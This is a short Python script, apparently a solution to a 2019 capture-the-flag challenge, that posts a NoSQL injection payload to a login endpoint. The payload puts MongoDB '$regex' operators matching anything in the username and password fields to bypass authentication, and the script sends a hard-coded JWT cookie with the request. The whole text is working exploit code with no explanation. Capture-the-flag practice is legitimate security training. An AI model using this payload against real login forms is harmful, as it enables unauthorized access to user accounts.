import requests

cookies = {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU1NzgwNzA0fQ.X06a66jW8O5lWQb4Na6fick_LdowsNASUTyK3YXz7y4"
}
url = "https://nosequels.2019.chall.actf.co/login"

payload = {
    "username": {
        "$regex": ".*"
    },
    "password": {
        "$regex": ".*"
    }
}
r = requests.post(url, json=payload, cookies=cookies)
print(r.text)
print(r.cookies)
